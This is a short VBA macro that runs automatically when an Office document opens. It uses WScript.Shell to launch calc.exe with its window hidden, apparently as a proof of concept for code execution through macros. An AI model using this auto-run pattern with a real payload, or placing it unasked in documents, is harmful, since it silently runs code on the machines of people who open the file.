Sub AutoOpen()
Set shell_object = CreateObject("WScript.Shell")
shell_object.Run "calc.exe",0
End Sub